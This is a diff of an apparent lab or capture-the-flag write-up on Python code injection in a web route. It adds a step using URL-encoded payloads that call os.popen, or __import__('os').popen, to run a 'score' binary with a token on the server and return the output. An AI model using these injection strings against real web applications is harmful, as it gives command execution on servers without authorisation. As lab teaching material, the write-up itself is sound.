@@ -18,3 +18,7 @@ If the return is "0", we know that the command got executed successfully. (if no
 3. It may also be valuable to get the value returned by the command. To do this, you can use os.popen:
 
 http://yourwebsite.com/hello/%22%2bstr(os.popen('/usr/local/bin/').read())%2b%22
+
+4. If the OS module is not loaded, we can do the following:
+
+http://yourwebsite.com/hello/%22%2bstr(__import__('os').popen('/usr/local/bin/score%20f8eb195b-453d-4802-abfc-5ee5404b5a1a').read())%2b%22
